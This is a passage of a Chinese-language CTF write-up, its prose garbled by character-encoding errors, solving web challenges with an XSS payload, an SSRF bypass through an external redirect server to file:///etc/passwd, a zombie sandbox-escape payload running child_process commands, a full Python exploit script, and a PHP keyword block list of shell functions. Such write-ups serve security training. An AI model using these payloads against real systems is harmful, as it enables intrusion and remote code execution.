è¿›è¡Œäº†è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚ä½¿ç”¨å¦‚ä¸‹è¯·æ±‚å³å¯æˆåŠŸå†™å…¥ä¸€æ®µ XSS è¿›è€Œä¿®æ”¹æ•°æ®åº“å†…å®¹ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>239</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1629598751; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1629598751; UM_distinctid=17b6ba7974b4b4-0499fe9efa6a05-b7a1d3b-144000-17b6ba7974c5ea; __jsluid_h=653dc6064ed641b63bdff02b1a713cc4; token=s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D.F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">content[]=&lt;script&gt;var+url%3d&quot;http%3a//127.0.0.1%3a8888/api/files%3fusername%3dadmin%26filename%3d../files/flag%26checksum%3dbe5a14a8e504a66979f6938338b0662c&quot;%3bquery%3dnew+XMLHttpRequest()%3bquery.open(&#x27;get&#x27;,url)%3bquery.send()%3b&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®åˆ° /api/files/be5a14a8e504a66979f6938338b0662c å³å¯ä¸‹è½½åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bf60142a-ebb2-47c2-93c3-6087340c0df0&#125;</span><br></pre></td></tr></table></figure><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><blockquote><p>crawler_z is a website supported with crawler and bucket, can you find a way to RCE?</p></blockquote><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>åœ¨ user.js ä¸‹å¯ä»¥å‘ç°å¦‚ä¸‹å…³é”®ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; affiliation, age, bucket &#125; = req.body;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">if</span> (!affiliation || !age || !bucket || <span class="keyword">typeof</span> (age) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (bucket) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (affiliation) != <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Parameters error or blank.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!utils.checkBucket(bucket)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Invalid bucket url.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> authToken;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            personalBucket: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> token = crypto.randomBytes(<span class="number">32</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        authToken = token;</span><br><span class="line">        <span class="keyword">await</span> Token.create(&#123; <span class="attr">userId</span>: req.session.userId, token, <span class="attr">valid</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">            valid: <span class="literal">false</span>,</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123;</span><br><span class="line">                userId: req.session.userId,</span><br><span class="line">                token: &#123; [Op.not]: authToken &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        next(createError(<span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(bucket)) &#123;</span><br><span class="line">        res.redirect(<span class="string">`/user/verify?token=<span class="subst">$&#123;authToken&#125;</span>`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Well, admin won&#x27;t do that actually XD. </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; <span class="attr">user</span>: user, <span class="attr">message</span>: <span class="string">&quot;Admin will check if your bucket is qualified later.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Not implemented yet</span></span><br><span class="line">router.get(<span class="string">&#x27;/bucket&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(user.bucket)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123; <span class="attr">message</span>: <span class="string">&quot;Sorry but our remote oss server is under maintenance&quot;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Should be a private site for Admin</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> page = <span class="keyword">new</span> Crawler(&#123;</span><br><span class="line">                userAgent: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">                referrer: <span class="string">&#x27;https://www.ichunqiu.com/&#x27;</span>,</span><br><span class="line">                waitDuration: <span class="string">&#x27;3s&#x27;</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> page.goto(user.bucket);</span><br><span class="line">            <span class="keyword">const</span> html = page.htmlContent;</span><br><span class="line">            <span class="keyword">const</span> headers = page.headers;</span><br><span class="line">            <span class="keyword">const</span> cookies = page.cookies;</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123; html, headers, cookies&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.json(&#123; <span class="attr">err</span>: <span class="string">&#x27;Error visiting your bucket. &#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ¯ POST è¯·æ±‚ä¸€æ¬¡ /profile éƒ½ä¼šå‘æ•°æ®åº“ä¸­å†™å…¥ä¸€ä¸ª tokenï¼Œè€Œåªæœ‰åœ¨æ‰€æäº¤çš„é“¾æ¥åˆä¹æ­£åˆ™çš„æ—¶å€™æ‰ä¼šè¿”å›ç»™ç”¨æˆ·ã€‚å…³é”®å°±åœ¨äºå³ä½¿ä¸è¿”å›ç»™ç”¨æˆ·ï¼Œtoken ä¹Ÿä¸ä¼šä»æ•°æ®åº“ä¸­è¢«åˆ é™¤ã€‚è€Œ verify åœ¨éªŒè¯æ—¶ä»…ä»…åˆ¤æ–­äº†åº“ä¸­æœ‰æ— ä¸ç”¨æˆ·æäº¤çš„ token ç›¸ç¬¦åˆçš„æœ‰æ•ˆ tokenï¼Œå¹¶ä¸åœ¨æ„æ˜¯å¦ä¸ºå½“æ­¤æäº¤ã€‚å› æ­¤åªéœ€è¦å…ˆæ­£å¸¸è¯·æ±‚ä¸€æ¬¡ï¼Œæ‹¿åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ tokenï¼Œå†ç”¨æ¶æ„é“¾æ¥é‡æ–°è¯·æ±‚æ›´æ–°ï¼Œä¹‹åä½¿ç”¨æœ‰æ•ˆçš„ token ç›´æ¥è¯·æ±‚ verify å³å¯å°†æ¶æ„é“¾æ¥æ›´æ–°è¿› bucketã€‚</p><p>é‰´äº /profile å¯¹æ‰€æäº¤çš„é“¾æ¥è¿›è¡Œäº†å¦‚ä¸‹ç­›é€‰ï¼Œæ¶æ„é“¾æ¥è¿˜éœ€è¦ç‰¹åˆ«æ„é€ ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">checkBucket</span>(<span class="params">url</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        url = <span class="keyword">new</span> URL(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.protocol != <span class="string">&quot;http:&quot;</span> &amp;&amp; url.protocol != <span class="string">&quot;https:&quot;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (url.href.includes(<span class="string">&#x27;oss-cn-beijing.ichunqiu.com&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„é™å®šäº†é“¾æ¥æ‰€ä½¿ç”¨çš„åè®®ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶è·³è½¬ï¼Œå› æ­¤å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨è¿›è¡Œ 302 è·³è½¬ã€‚åœ¨æœåŠ¡å™¨ä¸­å†™å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;Location: file///etc/passwd&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶æ¶æ„é“¾æ¥å†™ä½œ <code>http://8.136.8.210:3255#oss-cn-beijing.ichunqiu.com</code> å³å¯æˆåŠŸç»•è¿‡æ­¤å¤„çš„å¤„ç†ï¼Œè¿›è€Œ SSRFã€‚ç»“åˆé¢˜ç›®æè¿°å’Œä½¿ç”¨ file åè®®è¯»åˆ°çš„ /readflag æ–‡ä»¶å¯çŸ¥éœ€è¦æ‰§è¡Œ /readflag æ¥è·å– flagã€‚</p><h4 id="Zombie-Package-Code-Injection"><a href="#Zombie-Package-Code-Injection" class="headerlink" title="Zombie Package Code Injection"></a>Zombie Package Code Injection</h4><blockquote><p><a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p></blockquote><p>å¾ˆå®¹æ˜“å‘ç°ç¨‹åºä½¿ç”¨äº† zombie æ¥å®Œæˆå¯¹æˆ‘ä»¬æäº¤çš„ bucket çš„è®¿é—®ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨é¡µé¢ä¸­å†™å…¥ RCE çš„ä»£ç å³å¯ã€‚æ„é€ å‡ºå¦‚ä¸‹è½½è·æ¥è·å– flagã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="built_in">this</span>[<span class="string">&quot;constructor&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return(global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;).toString())&quot;</span>)());</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…åˆå¦‚ä¸‹è„šæœ¬å®Œæˆ SSRFã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line">session = requests.Client(</span><br><span class="line">    base_url=<span class="string">&quot;http://eci-2ze4wxo32t273t3wq2e7.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line">)</span><br><span class="line">TOKEN = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FetchToken</span>():</span></span><br><span class="line">    <span class="keyword">global</span> TOKEN</span><br><span class="line"></span><br><span class="line">    response = session.post(<span class="string">&quot;/user/profile&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;bucket&quot;</span>:<span class="string">f&quot;https://00000000000000000000000000000000.oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;affiliation&quot;</span>:<span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    TOKEN = response.content.decode()[<span class="number">41</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Fetched Token <span class="subst">&#123;TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Prepare</span>():</span></span><br><span class="line">    <span class="comment"># Sign Up</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;/signup&quot;</span>, data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;LemonPass&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password_confirm&quot;</span>: <span class="string">&quot;LemonPass&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Sign Up done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sign In</span></span><br><span class="line">    response = session.post(<span class="string">&quot;/signin&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;LemonPass&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Sign In done&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">bucket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> TOKEN</span><br><span class="line">    response = session.post(<span class="string">&quot;/user/profile&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;bucket&quot;</span>:<span class="string">f&quot;http://<span class="subst">&#123;bucket&#125;</span>/\x23oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;affiliation&quot;</span>:<span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/user/verify&quot;</span>, params=&#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: TOKEN</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/user/bucket&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prepare()</span><br><span class="line">FetchToken()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Exploit(<span class="string">&quot;8.136.8.210:10025&quot;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629628486321301/4bbfff035ec86ff8a82132b364f7dc501e6bc0be.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e96b6eee-f95d-4e72-a839-fa9552465b24&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h3><blockquote><p>æŸå®‰å…¨ç›‘æµ‹å¹³å°ã€‚</p></blockquote><p>ç»™å‡ºäº†ä¸€ä¸ªç½‘ç«™æ£€æµ‹çš„ä¸šåŠ¡ï¼Œå°è¯• <code>http://127.0.0.1/admin</code> å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª include123.php æ–‡ä»¶ã€‚ä½¿ç”¨åŒæ ·çš„å¥—è·¯å¯ä»¥è¯»å–åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//ç´¯äº†ç´¯äº†ï¼Œé¥®èŒ¶å…ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 